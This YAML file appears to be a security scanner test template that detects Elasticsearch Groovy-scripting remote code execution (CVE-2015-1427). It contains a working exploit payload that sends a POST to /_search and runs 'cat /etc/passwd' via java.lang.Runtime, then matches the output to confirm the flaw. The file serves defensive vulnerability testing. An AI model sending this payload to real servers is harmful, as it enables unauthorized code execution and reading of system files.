id: ELASTICSEARCH_RCE
info:
  name: "ElasticSearch Remote Code Execution"
  description: "ElasticSearch Remote Code Execution (RCE) vulnerabilities occur when improper input validation or insecure configurations allow attackers to execute arbitrary code on the ElasticSearch server. These vulnerabilities can arise from flaws in how user-supplied data is processed, often exploiting features like dynamic scripting. By leveraging such weaknesses, attackers can gain unauthorized access, manipulate data, or take control of the ElasticSearch environment. Implementing strict input validation, securing configurations, and keeping ElasticSearch updated are essential to mitigate these risks."
  details: "ElasticSearch Remote Code Execution (RCE) vulnerabilities typically result from flaws in the handling of user inputs or misconfigured settings that allow for unrestricted scripting. Attackers can exploit these vulnerabilities by crafting requests that execute malicious code on the server, often through dynamic scripting features like Painless scripting. This can lead to unauthorized access to sensitive data, manipulation of search queries, or even full server control. To mitigate these risks, itâ€™s crucial to disable dynamic scripting if not needed, enforce strict access controls, and regularly update ElasticSearch to patch known vulnerabilities."
  impact: "The impact of ElasticSearch Remote Code Execution (RCE) vulnerabilities can be severe, allowing attackers to execute arbitrary code and potentially gain full control over the ElasticSearch server. This may result in unauthorized access to sensitive data, alteration or deletion of indexed information, and the introduction of malicious code or backdoors. Additionally, such exploits can compromise the availability and integrity of the entire search infrastructure, leading to significant reputational damage, legal ramifications, and financial losses for affected organizations."
  category:
    name: COMMAND_INJECTION
    shortName: Command Injection
    displayName: Command Injection
  subCategory: ELASTICSEARCH_RCE
  severity: CRITICAL
  tags:
    - Business logic
    - OWASP top 10
    - HackerOne top 10
  cwe:
    - CWE-78
  cve:
    - CVE-2015-1427

attributes:
  nature: INTRUSIVE
  plan: PRO
  duration: FAST
compliance_standards: compliance/command-injection.conf

api_selection_filters:
  response_payload:
    length:
      gt: 0
  method:
    neq: "OPTIONS"
execute:
  type: multiple
  requests:
    - req:
        - modify_method: POST
        - replace_body: '{"name": "test"}'
        - modify_url: "/website/blog/"
        - modify_header:
            content-type: "application/x-www-form-urlencoded"
        - validate:
            response_code:
              lt: 505
        - success: x2
        - failure: exit
    - req:
        - modify_method: POST
        - replace_body: '{"size":1, "script_fields": {"lupin":{"lang":"groovy","script": "java.lang.Math.class.forName(\"java.lang.Runtime\").getRuntime().exec(\"cat /etc/passwd\").getText()"}}}'
        - modify_url: "/_search"
        - modify_header:
            content-type: "application/x-www-form-urlencoded"
        - validate:
            response_code:
              eq: 200
            response_headers:
              for_one:
                key:
                  eq: "content-type"
                value:
                  eq: "application/json"
            response_payload:
              length:
                gt: 0
              regex: "root:.*:0:0:"
              not_contains:
                - <html>
                - </html>
        - success: vulnerable
        - failure: exit
strategy:
  run_once: /
